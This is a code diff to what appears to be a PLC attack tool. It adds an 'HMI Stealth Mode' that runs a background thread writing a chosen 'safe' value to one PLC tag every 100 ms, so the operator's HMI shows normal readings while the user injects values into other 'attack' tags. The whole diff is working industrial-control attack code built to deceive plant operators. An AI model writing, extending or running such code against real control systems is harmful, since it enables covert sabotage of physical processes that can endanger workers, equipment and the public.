@@ -6,6 +6,7 @@ import sys
 import os
 import io
 import re
+import threading
 import time
 import json
 import argparse
@@ -1434,18 +1435,77 @@ def phase5_plc_attack() -> PhaseResult:
                     pass
                 return raw
 
-            quit_all = False
+            quit_all   = False
+            stop_freeze: threading.Event | None = None   # set when stealth mode active
+
+            def _stop_stealth():
+                """Signal the freeze thread to exit and wait briefly for it."""
+                nonlocal stop_freeze
+                if stop_freeze and not stop_freeze.is_set():
+                    stop_freeze.set()
+                    time.sleep(0.2)
 
             # ── OUTER LOOP: tag selection ─────────────────────────────────────
             while not quit_all:
                 _render_tag_table()
+
+                # ── HMI Stealth Mode prompt ───────────────────────────────────
+                console.print()
+                if Confirm.ask(
+                    "[bold magenta]Enable HMI Stealth Mode? "
+                    "[dim](freeze a tag at a safe value in the background)[/dim][/bold magenta]",
+                    default=False,
+                ):
+                    _stop_stealth()   # kill any previous freeze thread first
+
+                    freeze_raw = Prompt.ask(
+                        f"[magenta]  Freeze tag # (1–{len(display_tags)})[/magenta]"
+                    ).strip()
+                    try:
+                        freeze_tag = _tname(display_tags[int(freeze_raw) - 1])
+                    except (ValueError, IndexError):
+                        warn("Invalid index — stealth mode skipped")
+                        freeze_tag = None
+
+                    if freeze_tag:
+                        freeze_cur = plc_conn.read(freeze_tag)
+                        freeze_cur_val = freeze_cur.value if freeze_cur else 0
+                        safe_raw = Prompt.ask(
+                            f"[magenta]  Safe value to lock [bold]{freeze_tag}[/bold] at "
+                            f"(current: [bold yellow]{freeze_cur_val}[/bold yellow])[/magenta]"
+                        ).strip()
+                        safe_value = _cast(safe_raw, freeze_cur_val)
+
+                        stop_freeze = threading.Event()
+
+                        def _freeze_loop(tag_name=freeze_tag, val=safe_value,
+                                         ev=stop_freeze):
+                            while not ev.is_set():
+                                try:
+                                    plc_conn.write((tag_name, val))
+                                except Exception:
+                                    pass
+                                time.sleep(0.1)
+
+                        t = threading.Thread(target=_freeze_loop, daemon=True)
+                        t.start()
+                        console.print(Panel(
+                            f"[bold white]Frozen tag :[/bold white] [bold yellow]{freeze_tag}[/bold yellow]\n"
+                            f"[bold white]Locked at  :[/bold white] [bold green]{safe_value}[/bold green]\n"
+                            f"[bold white]Interval   :[/bold white] 100 ms\n\n"
+                            f"[dim]HMI will display {safe_value} while you manipulate other tags[/dim]",
+                            title="[bold magenta] HMI STEALTH MODE ACTIVE [/bold magenta]",
+                            border_style="magenta", expand=False,
+                        ))
+
                 console.print(
-                    f"[dim]  Select a tag (1–{len(display_tags)})  |  [bold]q[/bold] = quit[/dim]"
+                    f"[dim]  Select attack tag (1–{len(display_tags)})  |  [bold]q[/bold] = quit[/dim]"
                 )
                 console.print()
                 raw_idx = Prompt.ask("[yellow]Tag #[/yellow]").strip().lower()
 
                 if raw_idx in ("q", "quit"):
+                    _stop_stealth()
                     quit_all = True
                     break
 
@@ -1477,11 +1537,13 @@ def phase5_plc_attack() -> PhaseResult:
                     ).strip().lower()
 
                     if raw_val in ("q", "quit"):
+                        _stop_stealth()
                         quit_all = True
                         break
 
                     if raw_val in ("b", "back"):
-                        break   # return to outer tag-selection loop
+                        _stop_stealth()
+                        break   # return to outer loop (re-prompts stealth mode)
 
                     inject_val = _cast(raw_val, cur_val)
 
